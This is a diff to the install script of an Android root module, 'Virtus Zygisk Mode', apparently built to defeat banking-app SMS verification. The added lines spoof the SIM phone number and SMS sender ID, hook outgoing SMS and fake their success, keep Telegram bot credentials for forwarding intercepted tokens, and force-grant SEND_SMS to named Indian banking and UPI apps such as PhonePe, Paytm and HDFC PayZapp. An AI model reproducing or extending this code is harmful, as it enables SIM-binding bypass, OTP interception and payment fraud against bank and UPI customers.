@@ -3,14 +3,14 @@
 
 ui_print "*******************************"
 ui_print "   Virtus Zygisk Mode           "
-ui_print "     v1.0.35 ISMS SEEN + BLOCK  "
-ui_print "  binder=1 = SMS path hooked    "
-ui_print "  Messages verify nuclear       "
+ui_print "     v1.0.36 NO-PERM + SAVE     "
+ui_print "  SEND_SMS allow (Axis fix)     "
+ui_print "  TG test once · global Save    "
 ui_print "  @Hivirtus                     "
 ui_print "*******************************"
 ui_print "! Flash → reboot → Hero SEND SMS"
-ui_print "! hook_status me isms_seen / blocked"
-ui_print "! sms_jni=0 normal — binder matter"
+ui_print "! No permission = fixed (appops)"
+ui_print "! Save once = all apps keep it"
 
 if [ -z "$MODPATH" ]; then
   ui_print "! ERROR: MODPATH not set"
@@ -71,34 +71,60 @@ fi
 [ -f "$MODPATH/zygisk/arm64-v8a.so" ] && ui_print "- arm64-v8a.so OK"
 [ -f "$MODPATH/zygisk/armeabi-v7a.so" ] && ui_print "- armeabi-v7a.so OK (32-bit)"
 
-# Always refresh safe defaults — PRESERVE telegram tokens if already saved
+# Always refresh safe defaults — PRESERVE telegram + phone + sender if already saved
 OLD_TG_TOKEN=""
 OLD_TG_CHAT=""
+OLD_PHONE=""
+OLD_SENDER=""
 for src in \
-  /data/local/tmp/hivirtus_telegram_credentials.json \
   /data/local/tmp/hivirtus_ui_save.json \
+  /data/local/tmp/hivirtus_telegram_credentials.json \
   /data/local/tmp/hivirtus_zygisk_mode_config.json \
+  "$MODPATH/ui_save.json" \
   "$MODPATH/config.json"
 do
   [ -f "$src" ] || continue
   [ -z "$OLD_TG_TOKEN" ] && OLD_TG_TOKEN=$(grep -o '"telegram_bot_token"[[:space:]]*:[[:space:]]*"[^"]*"' "$src" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
   [ -z "$OLD_TG_CHAT" ] && OLD_TG_CHAT=$(grep -o '"telegram_chat_id"[[:space:]]*:[[:space:]]*"[^"]*"' "$src" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
+  [ -z "$OLD_PHONE" ] && OLD_PHONE=$(grep -o '"mock_phone_sim1"[[:space:]]*:[[:space:]]*"[^"]*"' "$src" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
+  [ -z "$OLD_SENDER" ] && OLD_SENDER=$(grep -o '"inject_sender_id"[[:space:]]*:[[:space:]]*"[^"]*"' "$src" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
 done
+# Dedicated files beat empty JSON keys
+[ -z "$OLD_PHONE" ] && [ -f /data/local/tmp/hivirtus_spoof_phone.txt ] && \
+  OLD_PHONE=$(head -n1 /data/local/tmp/hivirtus_spoof_phone.txt 2>/dev/null | tr -d '\r\n')
+[ -z "$OLD_PHONE" ] && [ -f "$MODPATH/spoof_phone.txt" ] && \
+  OLD_PHONE=$(head -n1 "$MODPATH/spoof_phone.txt" 2>/dev/null | tr -d '\r\n')
+[ -z "$OLD_SENDER" ] && [ -f /data/local/tmp/hivirtus_sender_id.txt ] && \
+  OLD_SENDER=$(head -n1 /data/local/tmp/hivirtus_sender_id.txt 2>/dev/null | tr -d '\r\n')
+[ -z "$OLD_SENDER" ] && [ -f "$MODPATH/sender_id.txt" ] && \
+  OLD_SENDER=$(head -n1 "$MODPATH/sender_id.txt" 2>/dev/null | tr -d '\r\n')
+[ "$OLD_SENDER" = "AD-TEST-S" ] && OLD_SENDER=""
+
+PHONE_ON=false
+SPOOF_ON=false
+VSIM_ON=false
+if [ -n "$OLD_PHONE" ] && [ ${#OLD_PHONE} -ge 10 ]; then
+  PHONE_ON=true
+  SPOOF_ON=true
+  VSIM_ON=true
+fi
+SENDER_ON=false
+[ -n "$OLD_SENDER" ] && SENDER_ON=true
 
 cat > "$MODPATH/config.json" << EOF
 {
   "hide_root": false,
   "hide_developer": false,
-  "enable_sim1_mock": false,
-  "enable_phone_spoof": false,
-  "enable_virtual_sim": false,
-  "mock_phone_sim1": "",
+  "enable_sim1_mock": ${PHONE_ON},
+  "enable_phone_spoof": ${SPOOF_ON},
+  "enable_virtual_sim": ${VSIM_ON},
+  "mock_phone_sim1": "${OLD_PHONE}",
   "hook_outgoing_sms": true,
   "intercept_fake_success": true,
   "prefix_enabled": false,
   "prefix_text": "",
-  "override_incoming_sender": false,
-  "inject_sender_id": "",
+  "override_incoming_sender": ${SENDER_ON},
+  "inject_sender_id": "${OLD_SENDER}",
   "auto_forward_token": true,
   "fake_intercept_telegram": true,
   "telegram_bot_token": "${OLD_TG_TOKEN}",
@@ -109,27 +135,53 @@ cat > "$MODPATH/config.json" << EOF
 }
 EOF
 set_perm "$MODPATH/config.json" 0 0 0644
-# Wipe runtime spoof that triggers bad paths — NOT telegram creds
-rm -f /data/local/tmp/hivirtus_spoof_phone.txt 2>/dev/null
-rm -f /data/local/tmp/hivirtus_hooked_pkgs.txt 2>/dev/null
+# Do NOT wipe spoof/sender — menu cut / reflash pe settings rahein
 cp -f "$MODPATH/config.json" /data/local/tmp/hivirtus_zygisk_mode_config.json 2>/dev/null
-chmod 644 /data/local/tmp/hivirtus_zygisk_mode_config.json 2>/dev/null
+chmod 666 /data/local/tmp/hivirtus_zygisk_mode_config.json 2>/dev/null
+if [ -n "$OLD_PHONE" ] && [ ${#OLD_PHONE} -ge 10 ]; then
+  echo "$OLD_PHONE" > /data/local/tmp/hivirtus_spoof_phone.txt
+  echo "$OLD_PHONE" > "$MODPATH/spoof_phone.txt"
+  chmod 666 /data/local/tmp/hivirtus_spoof_phone.txt 2>/dev/null
+fi
+if [ -n "$OLD_SENDER" ]; then
+  echo "$OLD_SENDER" > /data/local/tmp/hivirtus_sender_id.txt
+  echo "$OLD_SENDER" > "$MODPATH/sender_id.txt"
+  chmod 666 /data/local/tmp/hivirtus_sender_id.txt 2>/dev/null
+fi
+# Keep ui_save if present
+if [ -f /data/local/tmp/hivirtus_ui_save.json ]; then
+  cp -f /data/local/tmp/hivirtus_ui_save.json "$MODPATH/ui_save.json" 2>/dev/null
+elif [ -f "$MODPATH/ui_save.json" ]; then
+  cp -f "$MODPATH/ui_save.json" /data/local/tmp/hivirtus_ui_save.json 2>/dev/null
+  chmod 666 /data/local/tmp/hivirtus_ui_save.json 2>/dev/null
+fi
 if [ -n "$OLD_TG_TOKEN" ] && [ -n "$OLD_TG_CHAT" ]; then
   printf '%s\n' "{\"telegram_bot_token\":\"${OLD_TG_TOKEN}\",\"telegram_chat_id\":\"${OLD_TG_CHAT}\"}" \
     > /data/local/tmp/hivirtus_telegram_credentials.json
-  chmod 644 /data/local/tmp/hivirtus_telegram_credentials.json 2>/dev/null
-  ui_print "- Telegram creds preserved"
-  # Kill spam leftovers; do NOT mark sent.hash — Save pe test fir se chal sake
+  chmod 666 /data/local/tmp/hivirtus_telegram_credentials.json 2>/dev/null
+  ui_print "- Telegram + phone + sender preserved"
+  # Kill spam leftovers; KEEP sent.hash so same token pe test dubara na aaye
   rm -f /data/local/tmp/hivirtus_tg_test.request \
         /sdcard/Documents/hivirtus_tg_test.request \
         /sdcard/Download/hivirtus_tg_test.request 2>/dev/null
-  rm -f /data/local/tmp/hivirtus_tg_boot_sent.flag 2>/dev/null
-  rm -f /data/local/tmp/hivirtus_tg_test_sent.hash 2>/dev/null
   echo "${OLD_TG_TOKEN}|${OLD_TG_CHAT}" > /data/local/tmp/hivirtus_tg_creds.hash 2>/dev/null
+  # Mark already-sent so flash/reboot pe 🚀 test spam na ho
+  echo "${OLD_TG_TOKEN}|${OLD_TG_CHAT}" > /data/local/tmp/hivirtus_tg_test_sent.hash 2>/dev/null
+  echo 1 > /data/local/tmp/hivirtus_tg_boot_sent.flag 2>/dev/null
   chmod 666 /data/local/tmp/hivirtus_telegram_credentials.json 2>/dev/null
 else
   ui_print "- Telegram empty — bubble → Token+Chat → Save"
 fi
+
+# Clear leftover SEND_SMS ignore from older module versions
+ui_print "- Restoring SEND_SMS allow (No permission fix)..."
+for pkg in com.herofincorp.diyjourneys com.herofincorp.simplycash com.customer.herofincorp \
+           com.phonepe.app com.google.android.apps.nbu.paisa.user net.one97.paytm \
+           com.myairtelapp com.yespay.next com.hdfcbank.payzapp com.axis.mobile in.org.npci.upiapp; do
+  pm path "$pkg" >/dev/null 2>&1 || continue
+  appops set "$pkg" SEND_SMS allow 2>/dev/null || cmd appops set "$pkg" SEND_SMS allow 2>/dev/null || true
+  pm grant "$pkg" android.permission.SEND_SMS 2>/dev/null || true
+done
 
 hivirtus_apatch_allow_upi_inject 2>/dev/null
 
